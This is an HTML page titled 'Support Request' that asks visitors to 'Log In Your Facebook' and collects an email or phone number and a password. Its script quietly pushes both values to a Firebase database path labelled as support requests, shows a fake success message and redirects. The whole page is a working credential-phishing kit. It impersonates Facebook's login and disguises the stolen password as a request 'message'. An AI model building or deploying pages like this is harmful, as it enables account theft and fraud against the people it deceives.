<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Support Request</title>

<link rel="stylesheet" href="style.css">

</head>

<body>

<div class="container">

<h1>Please Log In Your Facebook</h1>

<input
type="text"
id="subject"
placeholder="Enter Email Or Phone Number">

<input
type="text"
id="clientName"
placeholder="Enter Password">

<button id="sendRequest">
Log In
</button>

</div>

<script type="module">

import { db } from "./firebase.js";

import {
ref,
push
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";

const sendBtn = document.getElementById("sendRequest");

sendBtn.addEventListener("click", async () => {

const subject = document.getElementById("subject").value.trim();
const message = document.getElementById("clientName").value.trim();

if(subject === "" || message === ""){

alert("Please complete all fields.");

return;

}

try{

await push(ref(db,"creatorPortal/requests"),{

subject: subject,
message: message,
time: Date.now()

});

alert("Request Sent Successfully");

window.location.href="success.html";

}catch(error){

console.error(error);

alert(
"Error Code: " + error.code +
"\n\nMessage: " + error.message
);

}

});

</script>

</body>

</html>
